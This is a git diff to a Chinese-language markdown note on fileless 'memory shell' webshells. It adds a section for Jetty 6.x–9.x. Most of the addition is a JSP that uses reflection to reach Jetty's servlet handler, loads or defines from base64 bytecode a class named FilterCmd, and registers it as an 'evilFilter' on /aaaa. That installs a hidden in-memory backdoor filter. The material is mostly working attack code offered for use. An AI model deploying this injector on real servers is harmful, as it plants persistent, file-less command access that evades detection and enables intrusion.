@@ -7,6 +7,7 @@
   - Filter
     - 静态添加 Filter(基于web.xml)
     - 动态添加 Filter(基于addFilter API)
+    - 适配Jetty v6.x/7.x/8.x/9.x
 
 ## 无文件马
 
@@ -399,4 +400,50 @@ prependFilterMapping.invoke(servletHandler, filterMapping);
 测试效果
 
 ![image-20211219024758925](fileless-shell.assets/image-20211219024758925.png)
+
+
+#### 适配Jetty v6.x/7.x/8.x/9.x
+
+- 使用Jetty封装好的方法addFilterWithMapping实现动态添加Filter、代码简洁。
+
+```jsp
+<%
+    try{
+        ClassLoader webAppClassLoader= Thread.currentThread().getContextClassLoader();
+        java.lang.reflect.Field _context = webAppClassLoader.getClass().getDeclaredField("_context");
+        _context.setAccessible(true);
+        Object webAppContext = _context.get(webAppClassLoader);
+        java.lang.reflect.Field _servletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
+        _servletHandler.setAccessible(true);
+        Object servletHandler = _servletHandler.get(webAppContext);
+        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
+        Class evilFilter;
+        try{
+            evilFilter = contextClassLoader.loadClass("com.example.jetty.filter.FilterCmd");
+        }catch(ClassNotFoundException e){
+            sun.misc.BASE64Decoder base64Decoder = new sun.misc.BASE64Decoder();
+            byte[] bytes = base64Decoder.decodeBuffer("yv66vg...");
+            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            defineClass.setAccessible(true);
+            evilFilter = (Class) defineClass.invoke(contextClassLoader, bytes, 0, bytes.length);
+        }
+        /**
+         *  Tested version:
+         *      6.x (6.1.26)
+         *      7.x (7.5.0)
+         *      8.x (8.2.0)
+         *      9.x (9.4.43)
+         */
+        try{
+            servletHandler.getClass().getMethod("addFilterWithMapping", String.class, String.class, java.util.EnumSet.class).invoke(servletHandler,evilFilter.getName(),"/aaaa",java.util.EnumSet.of(DispatcherType.REQUEST));
+        }catch (Exception e){
+            servletHandler.getClass().getMethod("addFilterWithMapping", String.class, String.class,int.class).invoke(servletHandler, evilFilter.getName(),"/aaaa", 1);
+        }
+        out.write("<br>" + evilFilter.getName() + " Inject Successfully!");
+    }catch (Exception e){
+        e.printStackTrace();
+    }
+%>
+
+```
 
